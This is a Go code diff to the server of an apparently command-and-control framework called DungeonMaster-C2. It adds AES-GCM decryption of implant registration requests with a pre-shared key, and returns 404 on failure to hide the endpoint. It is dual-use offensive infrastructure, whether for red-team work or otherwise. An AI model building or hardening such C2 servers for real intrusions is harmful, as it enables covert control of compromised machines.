@@ -2,12 +2,16 @@
 
 import (
 	"context"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
+	"strings"
 
 	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/collab"
 	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
@@ -90,8 +94,15 @@ func (s *C2Server) handleRegister(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// In production: decrypt body with a pre-shared registration key
-	// For Phase 1: accept plaintext JSON
+	if key := c2RegKey(); key != nil {
+		var decErr error
+		body, decErr = c2AESDecrypt(key, body)
+		if decErr != nil {
+			http.NotFound(w, r)
+			return
+		}
+	}
+
 	var req session.RegisterRequest
 	if err := json.Unmarshal(body, &req); err != nil {
 		s.log.Warn("c2: register: unmarshal", zap.Error(err))
@@ -247,6 +258,33 @@ func inferContentType(data []byte) (contentType, ext, evidenceType string) {
 		return "image/bmp", ".bmp", "screenshot"
 	}
 	return "application/octet-stream", ".bin", "task_output"
+}
+
+func c2RegKey() []byte {
+	h := os.Getenv("DM_REG_KEY")
+	if len(h) != 64 || h == strings.Repeat("0", 64) {
+		return nil
+	}
+	key, err := hex.DecodeString(h)
+	if err != nil || len(key) != 32 {
+		return nil
+	}
+	return key
+}
+
+func c2AESDecrypt(key, data []byte) ([]byte, error) {
+	if len(data) < 28 {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	return gcm.Open(nil, data[:12], data[12:], nil)
 }
 
 func envOrC2(key, fallback string) string {
